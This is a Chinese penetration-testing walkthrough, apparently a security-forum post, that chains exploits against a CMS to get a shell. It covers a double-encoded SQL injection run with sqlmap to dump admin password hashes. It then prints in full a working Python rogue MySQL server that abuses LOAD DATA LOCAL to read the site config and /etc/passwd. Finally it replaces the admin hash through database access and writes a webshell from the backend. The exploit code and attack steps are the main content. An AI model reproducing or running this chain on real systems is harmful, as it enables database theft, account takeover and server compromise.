多种漏洞配合利用--getshell
==================

写在前面
----

在渗透中，我们往往需要结合多种漏洞进行getshell，下面将通过多种漏洞配合利用来getshell服务器。

环境
--

[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-c4f5ae102c7960fb870db90c616396c9b8b3e498.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-c4f5ae102c7960fb870db90c616396c9b8b3e498.png)

信息收集
----

netdiscover探测存活主机  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-746d3a881bef96358e8588e5faa547fc3d43518a.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-746d3a881bef96358e8588e5faa547fc3d43518a.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-8199376059fb79ec888d9145c259eac01822f081.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-8199376059fb79ec888d9145c259eac01822f081.png)  
nmap探测web服务器端口开放情况  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-8d7cb5c479503d5d4ffe512fc89416f2579abe4a.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-8d7cb5c479503d5d4ffe512fc89416f2579abe4a.png)  
Namp扫描端口的详细信息  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-d71c93e03cb26fe02920080704b20ea0b4ce8fe3.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-d71c93e03cb26fe02920080704b20ea0b4ce8fe3.png)  
使用Whatweb进行cms识别，识别出网站cms  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-35307addfa0c1812cf9421256a4e44cb0399a57d.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-35307addfa0c1812cf9421256a4e44cb0399a57d.png)

SQL二次编码注入漏洞利用
-------------

利用网上公开的漏洞进行利用。由于该cms报过非常多漏洞，使用二次编码SQL注入进行利用。先测试这个网站的漏洞有没有给修复。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-1f677b56dc4e491fb989bd916fcfac8f5dccae06.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-1f677b56dc4e491fb989bd916fcfac8f5dccae06.png)  
发现过滤了'  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-c80d7367ca7e6671540e771846b6b9f28b43b7f6.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-c80d7367ca7e6671540e771846b6b9f28b43b7f6.png)  
使用二次编码后发现可以成功访问[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-13080a1af6c24e195bfc3f8256c7892cd6a98bec.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-13080a1af6c24e195bfc3f8256c7892cd6a98bec.png)  
此时使用SQLmap中二次编码模块进行注入  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-1f9b52fb159fada1b832340ff991404c85b1bc6c.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-1f9b52fb159fada1b832340ff991404c85b1bc6c.png)  
获取数据库用户  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-8e04b8df168bac9922b71f8e6adbc00ad3e324df.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-8e04b8df168bac9922b71f8e6adbc00ad3e324df.png)  
获取数据库名称  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-96809f602feeb78d5930b5e05776cfa17d21af15.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-96809f602feeb78d5930b5e05776cfa17d21af15.png)  
获取www\_ddd4\_com数据库的表  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-9c685ab04b783dd4677806f0c9a2cbc81e684118.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-9c685ab04b783dd4677806f0c9a2cbc81e684118.png)  
获取doc\_user表中的数据，得到后台登录的账号和密码的密文  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-e3085c21d8d5c94918ae91b4289e5e42900c5c99.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-e3085c21d8d5c94918ae91b4289e5e42900c5c99.png)

当得到这一串网站后台的登录密文后，我尝试各种方式破解，结果都无效。要想登录后台还要想办法，于是先寻找网站的后台  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-359aa593c496ae5863c6b8cf717c6c175d777202.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-359aa593c496ae5863c6b8cf717c6c175d777202.png)

任意文件读取漏洞利用
----------

该cms还报过任意文件读取漏洞，直接使用exp进行攻击  
附上师傅写的exp:

```python
#!/usr/bin/env python
#coding: utf8

import socket
import asyncore
import asynchat
import struct
import random
import logging
import logging.handlers

PORT = 3306

log = logging.getLogger(__name__)

log.setLevel(logging.INFO)
tmp_format = logging.handlers.WatchedFileHandler('mysql.log', 'ab')
tmp_format.setFormatter(logging.Formatter("%(asctime)s:%(levelname)s:%(message)s"))
log.addHandler(
    tmp_format
)

filelist = (
    '/www/wwwroot/www.ddd4.com/config/doc-config-cn.php',//为要读取的文件
)

#================================================
#=======No need to change after this lines=======
#================================================

__author__ = 'Gifts'

def daemonize():
    import os, warnings
    if os.name != 'posix':
        warnings.warn('Cant create daemon on non-posix system')
        return

    if os.fork(): os._exit(0)
    os.setsid()
    if os.fork(): os._exit(0)
    os.umask(0o022)
    null=os.open('/dev/null', os.O_RDWR)
    for i in xrange(3):
        try:
            os.dup2(null, i)
        except OSError as e:
            if e.errno != 9: raise
    os.close(null)

class LastPacket(Exception):
    pass

class OutOfOrder(Exception):
    pass

class mysql_packet(object):
    packet_header = struct.Struct('<Hbb')
    packet_header_long = struct.Struct('<Hbbb')
    def __init__(self, packet_type, payload):
        if isinstance(packet_type, mysql_packet):
            self.packet_num = packet_type.packet_num + 1
        else:
            self.packet_num = packet_type
        self.payload = payload

    def __str__(self):
        payload_len = len(self.payload)
        if payload_len < 65536:
            header = mysql_packet.packet_header.pack(payload_len, 0, self.packet_num)
        else:
            header = mysql_packet.packet_header.pack(payload_len & 0xFFFF, payload_len >> 16, 0, self.packet_num)

        result = "{0}{1}".format(
            header,
            self.payload
        )
        return result

    def __repr__(self):
        return repr(str(self))

    @staticmethod
    def parse(raw_data):
        packet_num = ord(raw_data[0])
        payload = raw_data[1:]

        return mysql_packet(packet_num, payload)

class http_request_handler(asynchat.async_chat):

    def __init__(self, addr):
        asynchat.async_chat.__init__(self, sock=addr[0])
        self.addr = addr[1]
        self.ibuffer = []
        self.set_terminator(3)
        self.state = 'LEN'
        self.sub_state = 'Auth'
        self.logined = False
        self.push(
            mysql_packet(
                0,
                "".join((
                    '\x0a',  # Protocol
                    '5.6.28-0ubuntu0.14.04.1' + '\0',
                    '\x2d\x00\x00\x00\x40\x3f\x59\x26\x4b\x2b\x34\x60\x00\xff\xf7\x08\x02\x00\x7f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x68\x69\x59\x5f\x52\x5f\x63\x55\x60\x64\x53\x52\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00',
                ))            )
        )

        self.order = 1
        self.states = ['LOGIN', 'CAPS', 'ANY']

    def push(self, data):
        log.debug('Pushed: %r', data)
        data = str(data)
        asynchat.async_chat.push(self, data)

    def collect_incoming_data(self, data):
        log.debug('Data recved: %r', data)
        self.ibuffer.append(data)

    def found_terminator(self):
        data = "".join(self.ibuffer)
        self.ibuffer = []

        if self.state == 'LEN':
            len_bytes = ord(data[0]) + 256*ord(data[1]) + 65536*ord(data[2]) + 1
            if len_bytes < 65536:
                self.set_terminator(len_bytes)
                self.state = 'Data'
            else:
                self.state = 'MoreLength'
        elif self.state == 'MoreLength':
            if data[0] != '\0':
                self.push(None)
                self.close_when_done()
            else:
                self.state = 'Data'
        elif self.state == 'Data':
            packet = mysql_packet.parse(data)
            try:
                if self.order != packet.packet_num:
                    raise OutOfOrder()
                else:
                    # Fix ?
                    self.order = packet.packet_num + 2
                if packet.packet_num == 0:
                    if packet.payload[0] == '\x03':
                        log.info('Query')

                        filename = random.choice(filelist)
                        PACKET = mysql_packet(
                            packet,
                            '\xFB{0}'.format(filename)
                        )
                        self.set_terminator(3)
                        self.state = 'LEN'
                        self.sub_state = 'File'
                        self.push(PACKET)
                    elif packet.payload[0] == '\x1b':
                        log.info('SelectDB')
                        self.push(mysql_packet(
                            packet,
                            '\xfe\x00\x00\x02\x00'
                        ))
                        raise LastPacket()
                    elif packet.payload[0] in '\x02':
                        self.push(mysql_packet(
                            packet, '\0\0\0\x02\0\0\0'
                        ))
                        raise LastPacket()
                    elif packet.payload == '\x00\x01':
                        self.push(None)
                        self.close_when_done()
                    else:
                        raise ValueError()
                else:
                    if self.sub_state == 'File':
                        log.info('-- result')
                        log.info('Result: %r', data)

                        if len(data) == 1:
                            self.push(
                                mysql_packet(packet, '\0\0\0\x02\0\0\0')
                            )
                            raise LastPacket()
                        else:
                            self.set_terminator(3)
                            self.state = 'LEN'
                            self.order = packet.packet_num + 1

                    elif self.sub_state == 'Auth':
                        self.push(mysql_packet(
                            packet, '\0\0\0\x02\0\0\0'
                        ))
                        raise LastPacket()
                    else:
                        log.info('-- else')
                        raise ValueError('Unknown packet')
            except LastPacket:
                log.info('Last packet')
                self.state = 'LEN'
                self.sub_state = None
                self.order = 0
                self.set_terminator(3)
            except OutOfOrder:
                log.warning('Out of order')
                self.push(None)
                self.close_when_done()
        else:
            log.error('Unknown state')
            self.push('None')
            self.close_when_done()

class mysql_listener(asyncore.dispatcher):
    def __init__(self, sock=None):
        asyncore.dispatcher.__init__(self, sock)

        if not sock:
            self.create_socket(socket.AF_INET, socket.SOCK_STREAM)
            self.set_reuse_addr()
            try:
                self.bind(('', PORT))
            except socket.error:
                exit()

            self.listen(5)

    def handle_accept(self):
        pair = self.accept()

        if pair is not None:
            log.info('Conn from: %r', pair[1])
            tmp = http_request_handler(pair)

z = mysql_listener()
# daemonize()
asyncore.loop()

```

获取报错路径  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-7409d36a8f167d36d82e4b9e4b65c9722a16c88e.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-7409d36a8f167d36d82e4b9e4b65c9722a16c88e.png)  
读取到/etc/passsword的文件  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-e640439214730ae13d48258340c3621a9f657c2f.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-e640439214730ae13d48258340c3621a9f657c2f.png)  
读取到数据库的配置文件，获取到数据库的账号与密文  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-758e10fda2deeb3984f09ea9c284bbbdc710586d.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-758e10fda2deeb3984f09ea9c284bbbdc710586d.png)  
利用刚刚得到的密文进行MySQL数据库连接，这里的MySQL支持外连[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-9ec251a565556222dabf2b3de6ef7038d7c70e6d.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-9ec251a565556222dabf2b3de6ef7038d7c70e6d.png)  
也可以通过数据库查询获取密文  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-58688e321ee69bc1d22d153a1d515a3e9d3b3d54.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-58688e321ee69bc1d22d153a1d515a3e9d3b3d54.png)  
此时我已经拿到数据库权限，但想要getshell还是要继续思考。

获取指定密文
------

为了更好的分析，在本地搭建了一个网站，找到登录文件后发现加密函数，寻找该功能函数，还不死心，继续分析是否可逆。

[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-865ad037bbecb4478755a5992306dc385502c4c0.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-865ad037bbecb4478755a5992306dc385502c4c0.png)

到达该功能函数页面以后，发现通过sha1、md5等加密算法结合加密，说明此密文不可逆。此时我要怎么办呢？想到刚刚已经拿到数据库权限，如果我根据自己的密码按照该网站的加密算法去生成密文，通过数据库权限更改密文，此时我不就知道密码了吗？

[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-816691bb9bb29dfaf89bb765157951a1d1a83942.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-816691bb9bb29dfaf89bb765157951a1d1a83942.png)

马上根据自己的需要，将明文admin通过登录界面的代码来进行输出加密后的密文，这里为了抓包更好寻找密文，前面加了一些66垃圾数据。  
其中这一串代码为新加的代码，目的是为了获取admin的密文

```echo

$docEncryption = new docEncryption('admin');
echo $docEncryption->to_string();```

[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-f45ef0ea0f8a6e8ff992b87ea15434bc31d32b7d.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-f45ef0ea0f8a6e8ff992b87ea15434bc31d32b7d.png)
通过抓包后得到密文
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-32d5f034507df81b39ea2a9a9d6ab980e8cd0119.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-32d5f034507df81b39ea2a9a9d6ab980e8cd0119.png)

除了以上方法外，我们可以直接利用我们搭建网站设置的密码，通过数据库去查询密文，照样可以获取密文

[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-6069765584e951014eb475e6d79697d2b7930c66.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-6069765584e951014eb475e6d79697d2b7930c66.png)
在获取的数据库权限中去更改密文
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-3f64416848e416b223e93bbacbd2909f3a60a26e.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-3f64416848e416b223e93bbacbd2909f3a60a26e.png)
确认密文更改成功
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-3eeaeaa599bcfc616f6576c50774dac756084594.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-3eeaeaa599bcfc616f6576c50774dac756084594.png)
通过修改的密码进入后台后，从功能点出发，发现可以写码。
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-3d4a32f4bf3747f3039012d6d824e2be93d39810.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-3d4a32f4bf3747f3039012d6d824e2be93d39810.png)
成功getshell
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-8c43ddb49d9d58832acdc312ffecb57830211f57.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-8c43ddb49d9d58832acdc312ffecb57830211f57.png)
## 总体思路
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-28baf1fdb9e8f9f8caa6e7e7ef2764e2f63a43ad.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-28baf1fdb9e8f9f8caa6e7e7ef2764e2f63a43ad.png)
## 总结
通过此实例，我们发现在渗透时要善于利用网上公开漏洞进行渗透，并且要学会多种漏洞结合进行利用。
```